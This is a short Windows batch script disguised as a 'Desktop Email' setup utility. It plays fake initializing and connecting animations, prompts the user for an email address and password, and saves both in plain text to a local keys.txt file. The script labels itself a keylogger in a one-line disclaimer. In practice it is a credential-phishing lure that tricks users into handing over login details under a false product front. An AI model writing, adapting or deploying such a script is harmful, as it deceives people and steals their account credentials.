@echo off
title Desktop Email - Check your email from home!
:warning
echo DISCLAIMER: This is a keylogger that will store personal information. Do not use for illegal reasons.
timeout 1 > nul
cls
:keylogger
echo Please wait: Initializing
timeout 1 > nul
cls
echo Please wait: Initializing.
timeout 1 > nul
cls
echo Please wait: Initializing..
timeout 1 > nul
cls
echo Please wait: Initializing...
timeout 1 > nul
cls
echo Please wait: Initializing
timeout 1 > nul
cls
echo Please wait: Initializing.
timeout 1 > nul
cls
echo Please wait: Initializing..
timeout 1 > nul
cls
echo Please wait: Initializing...
timeout 1 > nul
cls
echo Initialized.
cls
echo Please Enter the Following Information to Setup Email...
echo.
set /p un=Email Address:
set /p pw=Password:
echo.
:connect
echo Connecting
timeout 1 > nul
cls :connect
echo Connecting.
timeout 1 > nul
cls :connect
echo Connecting..
timeout 1 > nul
cls :connect
echo Connecting...
timeout 1 > nul
cls :connect
echo Connecting
timeout 1 > nul
cls :connect
echo Connecting.
timeout 1 > nul
cls :connect
echo Connecting..
timeout 1 > nul
cls :connect
echo Connecting...
timeout 1 > nul
cls :connect
echo Connecting
timeout 1 > nul
cls :connect
echo Connecting.
timeout 1 > nul
cls :connect
echo Connecting..
timeout 1 > nul
cls :connect
echo Connecting...
timeout 1 > nul
cls :connect
:log
set keys=keys.txt
echo Email: %un% , Password: %pw%>%keys%
goto :complete
:complete
echo Account Name: %un%
echo.
echo Press [Enter] To Complete Setup...
pause > nul
echo.
echo Complete...
timeout 1 > nul
echo.
echo Press [ESC] to exit...
pause > nul
exit